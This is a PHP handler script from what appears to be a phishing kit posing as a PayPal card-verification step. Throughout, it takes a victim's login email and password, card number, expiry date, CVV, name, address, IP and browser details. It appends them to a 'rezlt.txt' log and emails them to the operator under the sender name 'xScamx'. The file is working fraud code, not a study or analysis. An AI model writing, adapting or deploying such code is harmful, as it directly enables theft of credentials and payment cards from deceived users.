<?php

session_start();
error_reporting(0);

require_once __DIR__.'/functions.php';

if (isset($_POST['Fn']) || isset($_POST['Ln']) || isset($_POST['city']))
{
	if (!empty($_POST['Fn']) || !empty($_POST['Ln']) || !empty($_POST['city']))
	{

		$_SESSION['Nu']      = $_POST['Nu'];
		$Bin = $_SESSION['Bin']     = BinInfo($_POST['Nu']);
		$_SESSION['EpMo']    = $_POST['EpMo'];
		$_SESSION['EpYr']    = $_POST['EpYr'];
		$_SESSION['C5c']     = $_POST['C5c'];
		$_SESSION['Fn']      = $_POST['Fn'];
		$_SESSION['Ln']      = $_POST['Ln'];
		$_SESSION['city']    = $_POST['city'];
		$_SESSION['state']   = $_POST['state'];
		$_SESSION['zip']     = $_POST['zip'];
		$_SESSION['countryx'] = $_POST['country'];
		$_SESSION['address'] = $_POST['address'];

		$RezltMessage = 
		"
		<!DOCTYPE html><html><head><title></title><style type='text/css'>*{font-family: arial;}body{background: #f7f7f7;}table tr td{padding: 5px;}table{width: 600px;}.td1{width: 30%;font-weight: bold;}.td2{width: 70%;}.content{ width: 600px; background: #fff;}.title{ padding: 8px; background: black; color: #fff; font-weight: bold; letter-spacing: 3px;}.row { display: table-row; background: #ffffff;}.row:nth-of-type(odd) { background: #e9e9e9;}@media screen and (max-width: 600px) { table { width: 100%; } .content{ width: 100%; }}</style></head><body><center><br><br><br>
		<div class='content'>
			<div class='title'>LOGIN INFO</div>
			<table>
				<tr class='row'>
					<td class='td1'>Email</td>
					<td class='td2'>{$_SESSION['EM']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Password</td>
					<td class='td2'>{$_SESSION['PW']}</td>
				</tr>
			</table>
			<div class='title'>BILLING AND CARD</div>
			<table>
				<tr class='row'>
					<td class='td1'>First Name</td>
					<td class='td2'>{$_POST['Fn']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Last Name</td>
					<td class='td2'>{$_POST['Ln']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>City</td>
					<td class='td2'>{$_POST['city']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>State</td>
					<td class='td2'>{$_POST['state']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Zip</td>
					<td class='td2'>{$_POST['zip']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Country</td>
					<td class='td2'>{$_POST['country']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Address</td>
					<td class='td2'>{$_POST['address']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Card Number</td>
					<td class='td2'>{$_POST['Nu']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Exp Date</td>
					<td class='td2'>{$_POST['EpMo']}/{$_POST['EpYr']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>CSC/CVV</td>
					<td class='td2'>{$_POST['C5c']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>Bin</td>
					<td class='td2'>{$Bin->issuer}</td>
				</tr>
			</table>
			<div class='title'>MACHINE INFO</div>
			<table>
				<tr class='row'>
					<td class='td1'>IP</td>
					<td class='td2'><a href='http://geoiptool.com/?ip={$_SERVER['REMOTE_ADDR']}'>{$_SERVER['REMOTE_ADDR']}</a></td>
				</tr>
				<tr class='row'>
					<td class='td1'>COUNTRY</td>
					<td class='td2'>{$_SESSION['country']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>BROWSER</td>
					<td class='td2'>{$_SERVER['HTTP_USER_AGENT']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>BROWSER LANG</td>
					<td class='td2'>{$_SERVER['HTTP_ACCEPT_LANGUAGE']}</td>
				</tr>
				<tr class='row'>
					<td class='td1'>DATE</td>
					<td class='td2'>".date('Y-m-d', time())." ".date('H:i:s', time())."</td>
				</tr>
			</table>
		</div>
		</center></body></html>
		";

		$RezltHeader = "MIME-Version: 1.0" . "\r\n";
		$RezltHeader .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$RezltHeader .= 'From: xScamx <miakhalifa@brazzers.com>' . "\r\n";

		$RezltSubject = "New Ppl-Card From [ ".$_SESSION['country']." - ".$_SERVER['REMOTE_ADDR']." ]";

$TextContent = "
======== LOGIN ========
Email      : ".$_SESSION['EM']."
Password   : ".$_SESSION['PW']."
======== CARD ========
CardNumber : ".$_POST['Nu']."
Exp Date   : ".$_POST['EpMo']."/".$_POST['EpYr']."
CSC/CVV    : ".$_POST['C5c']."
Bin        : ".$Bin->issuer."
======== ADDRESS ========
First Name : ".$_POST['Fn']."
Last Name  : ".$_POST['Ln']."
City       : ".$_POST['city']."
State      : ".$_POST['state']."
Zip        : ".$_POST['zip']."
Country    : ".$_POST['country']."
Address    : ".$_POST['address']."
======== MACHINE ========
IP         : http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."
COUNTRY    : ".$_SESSION['country']."
BROWSER    : ".$_SERVER['HTTP_USER_AGENT']."
BROW.LANG  : ".$_SERVER['HTTP_ACCEPT_LANGUAGE']."
DATE       : ".date('Y-m-d', time())." ".date('H:i:s', time())."


";

		$SaveResult = fopen('../../rezlt.txt', 'a');
		fwrite($SaveResult, $TextContent);
		fclose($SaveResult);

		@mail($to, $RezltSubject, $RezltMessage, $RezltHeader);

		$json['status'] = 'success';
		echo json_encode($json);
	}
}
